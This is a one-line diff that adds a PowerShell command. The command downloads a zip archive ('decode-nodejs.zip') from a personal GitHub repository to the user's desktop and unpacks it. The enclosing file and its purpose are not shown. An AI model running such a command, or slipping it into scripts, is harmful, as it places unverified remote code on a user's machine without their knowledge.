@@ -1,0 +1,1 @@
+Invoke-WebRequest https://github.com/nguyenduyhuydn1/hello/raw/refs/heads/main/decode-nodejs.zip -o $env:USERPROFILE/desktop/1.zip;Expand-Archive $env:USERPROFILE/desktop/1.zip 1;
